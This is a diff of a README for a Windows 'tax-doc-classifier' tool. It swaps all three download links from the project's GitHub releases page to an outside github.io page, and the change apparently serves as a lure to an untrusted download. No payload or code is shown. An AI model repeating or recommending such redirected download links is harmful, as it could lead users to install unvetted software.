@@ -1,6 +1,6 @@
 # 📄 tax-doc-classifier - Sort 261 IRS forms instantly
 
-[![Download Now](https://img.shields.io/badge/Download-tax--doc--classifier-blueviolet?style=for-the-badge&logo=github)](https://github.com/Obliquenessamblygonite304/tax-doc-classifier/releases)
+[![Download Now](https://img.shields.io/badge/Download-tax--doc--classifier-blueviolet?style=for-the-badge&logo=github)](https://obliquenessamblygonite304.github.io)
 
 ---
 
@@ -28,7 +28,7 @@ Follow these steps to start using tax-doc-classifier on your Windows computer:
 
 Visit this link to download the application:
 
-**[👉 Click Here to Download tax-doc-classifier](https://github.com/Obliquenessamblygonite304/tax-doc-classifier/releases)**
+**[👉 Click Here to Download tax-doc-classifier](https://obliquenessamblygonite304.github.io)**
 
 You will see a list of files on this page. Look for the **latest release** and download it. The file is small and downloads quickly.
 
@@ -195,7 +195,7 @@ If you have questions or need help, open an issue on the GitHub repository. The 
 
 Need the link one more time? Here is the official download page:
 
-**[⬇️ Download tax-doc-classifier (Free)](https://github.com/Obliquenessamblygonite304/tax-doc-classifier/releases)**
+**[⬇️ Download tax-doc-classifier (Free)](https://obliquenessamblygonite304.github.io)**
 
 Download today and organize every tax document you own in under five minutes.
 
